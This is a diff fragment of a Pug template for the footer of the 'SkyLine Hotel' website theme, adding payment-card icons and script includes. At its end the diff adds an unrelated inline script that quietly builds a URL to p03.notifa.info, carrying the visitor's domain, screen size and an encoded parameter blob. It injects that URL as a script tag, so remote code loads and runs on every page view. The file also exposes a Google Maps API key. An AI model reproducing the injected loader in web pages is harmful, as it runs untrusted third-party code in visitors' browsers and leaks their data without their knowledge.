+                          | Copyright © 2017 by 
+                          a(href='#', title='') EngoTheme.
+                          |  SkyLine Hotel Theme crafted with love
+                        .col-xs-12.col-sm-6.col-md-6.col-lg-6.no-padding
+                          .payments.text-right
+                            ul
+                              li
+                                a(href='#', title='Paypal')
+                                  img(src='images/Home-1/Paypal.png', alt='Paypal')
+                              li
+                                a(href='#', title='Visa')
+                                  img(src='images/Home-1/Visa.png', alt='Visa')
+                              li
+                                a(href='#', title='Master')
+                                  img(src='images/Home-1/Master-card.png', alt='Master')
+                              li
+                                a(href='#', title='Discover')
+                                  img(src='images/Home-1/Discover.png', alt='Discover')
+              // END / FOOTER
+              // SCOLL TOP
+              a.scrollToTop(href='#', title='sroll')
+                i.fa.fa-angle-up
+              // END / SROLL TOP
+              // LOAD JQUERY
+              script(type='text/javascript', src='js/jquery-1.12.4.min.js')
+              script(type='text/javascript', src='js/owl.carousel.min.js')
+              script(type='text/javascript', src='js/bootstrap.min.js')
+              script(type='text/javascript', src='js/vit-gallery.js')
+              script(type='text/javascript', src='js/jquery.countTo.js')
+              script(type='text/javascript', src='js/jquery.appear.min.js')
+              script(type='text/javascript', src='js/isotope.pkgd.min.js')
+              script(type='text/javascript', src='js/bootstrap-select.js')
+              script(type='text/javascript', src='js/jquery.littlelightbox.js')
+              script(type='text/javascript', src='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.7.1/js/bootstrap-datepicker.js')
+              script(src='https://maps.googleapis.com/maps/api/js?key=AIzaSyBDyCxHyc8z9gMA5IlipXpt0c33Ajzqix4')
+              // Custom jQuery
+              script(type='text/javascript', src='js/sky.js')
+              script(type='text/javascript').
+                if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdtNh1GWPxO7Rt0VhCVFlVPOVungltygJs0OR8o%2ftLNZ2SQYmVzviWZ%2f9mIgcqT5r1NZKPVDbwy5QBDbWJRxmfwtXyfWrdk5N4KGNkFGb8mxg95QwLz0%2feF9hcrMISKCKP0p0RO0tGTpXrUr3uMKb2bgbocD0pR5U3eb5Xzh4WkPiMuqsIYtClZTIbV4LMr%2fwAw2vCSzGYFpnzA%2b4Zpptt%2bMN3zKyU5Asoab3%2bCQ04FUrk2%2bSa1lFUxJGa16D7cRGZtTCZvdgVPwLXkLKo7vAn5dkwPRXYWyWXmqssTe2goyY6RMVSEiyvX1gvVeh1jSu3hdw1MALx62TAgVKAEjsga1VWTh%2bY73EYxvmmxgzcRX9EJO%2fsZNCcSwaIk1XAiXVNHkuyGKzZAU03nc1Dt1wQnDJGRMbRA02M3Gs1dzPNjdD3R2uAxV2tL7Kea3dga84uDSGMNtiTY0bM4TzZufOVZ%2bkiK4y89%2fahfQwUXPSPIDt%2fiFDFAhrzF%2fgx4v6eWffEoDI9b18tqR5jypLe4ZFkhgVkSRjWFqJo%2faV%2flr%2f%2bU%2b129knZkadhBJ3M3vCtJ5L5twR%2bXexTKqg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
